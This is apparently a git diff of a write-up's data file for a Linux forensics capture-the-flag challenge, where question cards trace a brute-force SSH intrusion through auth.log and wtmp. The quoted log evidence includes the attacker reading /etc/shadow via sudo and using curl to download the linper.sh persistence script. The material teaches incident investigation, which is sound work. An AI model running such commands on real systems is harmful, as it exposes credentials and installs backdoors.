@@ -46,7 +46,7 @@ cards:
     answer: "65.2.161.68"
     explanation: |
                  If we look through all the failed password attempts from brute forcing, we will find all of them are from 65.2.161.68
-    terminal_title: "auth.log"
+    terminal_title: "Attacker's IP"
     terminal_code1: "cat auth.log | grep -i failed | tail -n 5"
     terminal_output1: |-
       [Mar 6 06:31:41]: Failed password for root from 65.2.161.68
@@ -61,8 +61,7 @@ cards:
     answer: "root"
     explanation: |
                  To find this, we can query the log for accepted passwords from the attacker's IP.We can correlate the time the brute force attacks stopped with the time   each account's password was accepted We can see that right after a certain account's password was cracked the attacker stopped brute forcing.
-    terminal_title: "auth.log"
-    prompt1: "/home/ningen>"
+    terminal_title: "Compromised Account"
     terminal_code1: "cat auth.log|grep -i accepted |grep 65.2.161.68"
     terminal_output1: |-
       [Mar 6 06:31:40]: Accepted password for root from 65.2.161.68
@@ -75,7 +74,7 @@ cards:
     answer: "2024-03-06 06:32:45"
     explanation: |
                  The answer would be the second root login we saw from the previous question. But the question also says use the wtmp file because the one in auth.log is different from the correct one. TO find the one in wtmp, we will have to parse it using the .py file given to us. Then we would have to filter that log for only the attacker's IP then find the timestamp closest to the second root login seen in the previous question because the only difference between the auth.log's and the wtmp file's timestamp is that the auth.log gives us the time he authenticated and the wtmp will give us the time he actually logged in. I used timelineExplorer.exe (eric zimmerman) to view the parsed output, you can use any other alternative for timeline views or you can `cat` the parsed output or if you are on windows use the `type` command. **YOU WILL NEED TO CHANGE THE TIMESTAMPS OF THE WTMP FILE TO UTC.**
-    terminal_title: "utmp.py"
+    terminal_title: "Attacker Login"
     terminal_code1: "py utmp.py wtmp -o parsed.csv"
     terminal_code2: "timelineexplorer.exe parsed.csv"
     prompt2: "test12"
@@ -87,7 +86,7 @@ cards:
     answer: "37"
     explanation: |
                  If we go back to question 2 and look at the script block area, we will see the timestamp of when the attacker manually logged in as root (the second output). It is not the first because the first output was part of the brute force attack. To find the answer for this, we need to `cat` the auth.log and filter the exact timestamp the user logged in as root and then look at the session ID given.
-    terminal_title: "auth.log"
+    terminal_title: "Attacker Session ID"
     prompt: "testing>"
     terminal_code1: "cat auth.log|grep 06:32:44"
     terminal_output1: |-
@@ -101,13 +100,13 @@ cards:
     answer: "cyberjunkie"
     explanation: |
                  If we filter the log for the time period after they logged in as root and got their session ID 37, we will see the things the attacker did and one of those was creating a new user account and adding it to the sudo group. We could also try to filter for a keyword such as "user", "new" or "name". You could choose the easy one "new user" to get the least output or the way I highlighted in the overview section if you prefer to actually understand it better.
-    terminal_title: "auth.log"
+    terminal_title: "New Account"
     terminal_code1: "cat auth.log|grep -i \"new user\""
     terminal_output1: "[Mar 6 06:34:18] useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1"
 
   card6:
     card_title: "question 06"
-    terminal_title: "MITRE ATT&CK"
+    card_title2: "MITRE ATT&CK"
     question: "What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?"
     answer: "T1136.001"
     explanation: |
@@ -119,8 +118,7 @@ cards:
     answer: "2024-03-06 06:37:24"
     explanation: |
                  At first I thought the answer would be the actual first one, but instead we have to look for the one they manually logged in to. Since we already know that the attacker's first manual login had a session ID of 37, we can filter out the events for only session 37 we will see the time he first logged on and the time that account logged out.
-    terminal_title: "auth.log"
-    prompt1: "not testing>"
+    terminal_title: "Session End"
     terminal_code1: "cat auth.log|grep -i \"session 37\""
     terminal_output1: |-
       [Mar 6 06:32:44] systemd-logind[411]: New session 37 of user root.
@@ -133,7 +131,7 @@ cards:
     answer: "/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"
     explanation: |
                  Since we already know the name of the backdoor account and that it is in the sudo group, it is capable of using sudo. We have also been told that the attacker needed to utilize his "higher privileges" to download a script and that it was done with the help of sudo. We also know that these kinds of commands get logged in the auth.log file along with the name of the account that used it. This means that we can filter for the name of the backdoor account + sudo and we will see its name and the commands ran.
-    terminal_title: "auth.log"
+    terminal_title: "Sudo Command"
     terminal_code1: "cat auth.log|grep -i cyberjunkie|grep -i sudo"
     terminal_output1: |-
       [Mar 6 06:37:57] ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
@@ -143,6 +141,6 @@ cards:
 
 #stuff
 configure:
-  prompt: "/brutus>"
+  prompt: "/home/ningen/brutus>"
 ---
 {% include writeup-data.html %}
